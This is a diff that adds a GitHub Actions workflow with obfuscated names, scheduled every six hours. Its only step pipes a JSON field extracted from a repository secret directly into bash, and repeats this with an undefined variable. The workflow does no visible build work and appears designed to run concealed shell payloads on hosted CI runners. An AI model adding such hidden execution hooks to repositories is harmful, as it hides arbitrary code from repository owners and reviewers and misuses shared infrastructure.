@@ -1,0 +1,18 @@
+name: xingshunjian6751
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '27 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xingshunjian6751
+        env:
+          cgsgi1413: ${{ secrets.cgsgi1413 }}
+        run: |
+          echo $cgsgi1413 | jq -r .oxst219 | /bin/bash
+          echo $h496 | jq -r .vo6399 | /bin/bash
+
